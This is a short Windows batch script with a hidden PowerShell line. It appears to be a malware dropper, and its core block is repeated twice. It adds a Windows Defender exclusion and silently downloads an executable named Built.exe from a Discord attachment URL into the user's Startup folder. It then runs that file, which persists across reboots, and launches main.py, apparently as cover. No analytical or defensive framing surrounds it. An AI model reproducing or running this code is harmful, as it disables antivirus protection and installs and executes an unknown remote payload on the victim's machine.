powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"



if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

start main.py


@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"



start main.py

@echo off
